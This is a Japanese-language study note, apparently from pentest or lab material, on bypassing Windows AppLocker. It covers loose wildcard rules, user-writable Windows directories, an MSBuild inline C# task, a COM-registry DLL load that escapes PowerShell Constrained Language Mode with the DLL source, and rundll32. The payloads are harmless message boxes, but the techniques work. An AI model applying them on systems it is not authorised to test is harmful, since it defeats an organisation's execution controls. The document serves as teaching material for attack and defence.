AppLockerのバイパスを見つけられるかどうかはポリシー自体に依存

## パスのワイルドカード

ワイルドカードが過度に許可的になっているケース
```xml
<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">

    <Conditions>

        <FilePathCondition Path="*\App-V\*"/>

    </Conditions>

</FilePathRule>
```

`App-V` という名前のディレクトリであればどこに存在する実行ファイルであっても、このルールによって実行が許可される

## 書き込み可能なディレクトリ
多くのルールのデフォルト許可パスである `%WINDIR%\*` の配下には、標準ユーザーが書き込み可能なディレクトリが複数存在し、そこに置くことで実行が許可される

対象となるパスは以下
```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
```

![[images/Pasted image 20260523202212.png]]

## LOLBAS
任意のコードを実行可能なLOLBASの一部も、AppLockerのバイパスに利用可能
これらが `%WINDIR%\*` などのホワイトリスト済みの場所に存在するため

MSBuildはその一例で、特別に細工した `.csproj` ファイルから任意のC#コードを実行
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using Microsoft.Build.Utilities;
        using System.Windows.Forms;

        public class MSBuild : Task
        {
            public override bool Execute()
            {
                MessageBox.Show("Hello World", "AppLocker Bypass");
                return true;
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

![[images/Pasted image 20260523202222.png]]
## Powershell CLM
AppLockerはPowerShellの言語モードを `FullLanguage`（完全言語）から `ConstrainedLanguage`（制約言語）に変更

```powershell
PS C:\Users\pchilds> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\Users\pchilds> [System.Console]::WriteLine("Hello World")
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```

`New-Object` コマンドレットを使用して `WScript.Shell` などのCOMオブジェクトをロードすることは依然として可能
```powershell
PS C:\Users\pchilds> New-Object -ComObject WScript.Shell

SpecialFolders     CurrentDirectory
--------------     ----------------
System.__ComObject C:\Users\pchilds
```

これを悪用すると、任意のDLMMをPowershellプロセスにロードするカスタムCOMオブジェクトを作成可能
```powershell
PS C:\Users\pchilds> [System.Guid]::NewGuid()

Guid
----
6136e053-47cb-4fdd-84b1-381bc5f3edb3

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Users\pchilds\Desktop\bypass.dll'
C:\Users\pchilds> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'

C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
C:\Users\pchilds> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
```

![[images/Pasted image 20260523202237.png]]

DLLのソースコード
```cpp
#include <windows.h>
#include <stdio.h>

extern "C" __declspec(dllexport) BOOL execute() {
    MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        return execute();
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

## rundll32
AppLockerはDLLルールを適用することができますが、パフォーマンス上の懸念から、これが有効化されていることはほとんどなし